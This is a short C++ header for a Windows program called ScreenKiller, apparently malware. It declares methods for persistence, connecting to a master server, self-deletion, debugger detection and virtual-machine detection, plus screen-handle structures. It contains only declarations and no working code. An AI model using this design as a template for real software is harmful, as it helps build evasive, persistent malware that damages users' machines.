#ifndef _SCREENKILLER_H_
#define _SCREENKILLER_H_

#include <windows.h>
#include <thread>
#include <string>

#define SCREEN_WIDTH	GetSystemMetrics(SM_CXSCREEN)
#define SCREEN_HEIGHT	GetSystemMetrics(SM_CYSCREEN)
#define DIVIDERS		5

#define MAX_FILE 256

#define DEBUG_OR_VM_EXITCODE (1337)

class ScreenKiller
{
public:
	ScreenKiller();

	~ScreenKiller();

	void deploy();

	void suicide();

	void exit_if_debugged();

private:
	bool deploy_inner();

	bool get_persistency();

	bool connect_to_master_server();

	void exit_if_vm_cpuid();

	bool is_debugged1();

	bool is_debugged2();

	void check_secret_file();

	char *m_temp_path;
	bool m_alive;
	bool m_persistent;
	bool m_connected;
	std::thread m_runner_thread;
};

typedef struct ScreenProps
{
	RECT rectScreen;
	HDC hdcScreen;
} ScreenProps, * PScreenProps;

#endif /*_SCREENKILLER_H_*/